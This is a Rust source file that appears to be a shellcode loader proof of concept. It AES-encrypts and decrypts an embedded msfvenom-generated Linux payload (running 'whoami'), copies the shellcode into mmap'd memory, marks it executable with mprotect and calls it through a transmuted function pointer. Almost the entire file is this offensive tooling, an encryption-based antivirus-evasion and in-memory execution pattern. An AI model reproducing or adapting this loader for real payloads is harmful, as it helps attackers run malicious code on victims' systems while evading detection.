use std:: {
    ptr,
};
use libc::{
    mmap,
    mprotect,
    memcpy,
    PROT_EXEC,
    PROT_READ,
    PROT_WRITE,
    MAP_ANON,
    MAP_PRIVATE,
    MAP_FAILED
};
use libaes::Cipher;
use rand::*;

fn enc_buf(
    buf : &[u8],
    key : [u8; 32],
    iv: [u8; 16]) -> Vec<u8> {

    let cipher = Cipher::new_256(&key);

    let ciphertext = cipher.cbc_encrypt(&iv , &buf);

    ciphertext
}

fn dec_buf(
    enc_buf: &Vec<u8>,
    key: [u8; 32],
    iv: [u8; 16]
) -> Vec<u8> {
    let cipher = Cipher::new_256(&key);
    let dec_buf = cipher.cbc_decrypt(&iv, enc_buf);

    dec_buf // Return the Vec<u8> by value (ownership is transferred to the caller)
}

struct Keys {
    key : [u8;32],
    iv  : [u8; 16]
}

impl Keys {
    fn new() -> Self {
        Self {
            key : Self::genrate_key(),
            iv  : Self::genrate_iv()
        }
    }

    fn genrate_key() -> [u8;32] {
        let mut key = [0u8; 32];
        rand::thread_rng().fill_bytes(&mut key);
        
        key
    }

    fn genrate_iv() -> [u8; 16] {
        let mut iv = [0u8; 16];
        rand::thread_rng().fill_bytes(&mut iv);
        
        iv
    }
}

fn exec_ (buf : &[u8]) -> i32 {
    unsafe {
        let size = buf.len();
        let addr = mmap(
                ptr::null_mut(),
                size,
                PROT_READ | PROT_WRITE,  // First allocate with RW permission
                MAP_PRIVATE | MAP_ANON,
                -1,
                0,
            );

        if addr == MAP_FAILED {
            panic!("Memmory allocation failed");
        }

        memcpy(addr, buf.as_ptr() as *const libc::c_void, size);

        // Mark the memory as executable
        if mprotect(addr, size, PROT_READ | PROT_EXEC) != 0 {
            panic!("Failed to set memory as executable");
        }

        // Cast the memory to a function pointer and call it
        let exec_func: extern "C" fn() -> i32 = std::mem::transmute(addr);
        let result = exec_func();

        result
    }

}


fn main() {
    // Set up key and IV
    let keys = Keys::new();
    let key = keys.key;
    let iv  = keys.iv;

    // msfvenom -p linux/x64/exec CMD=whoami -f rust
    let shellcode: [u8; 43] = [0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,
        0x73,0x68,0x00,0x99,0x50,0x54,0x5f,0x52,0x66,0x68,0x2d,0x63,
        0x54,0x5e,0x52,0xe8,0x07,0x00,0x00,0x00,0x77,0x68,0x6f,0x61,
        0x6d,0x69,0x00,0x56,0x57,0x54,0x5e,0x6a,0x3b,0x58,0x0f,0x05
    ];

    let enc = enc_buf(&shellcode , key , iv);

    let dec = dec_buf(&enc , key , iv);

    assert_eq!(dec, shellcode);

    exec_(&shellcode);

}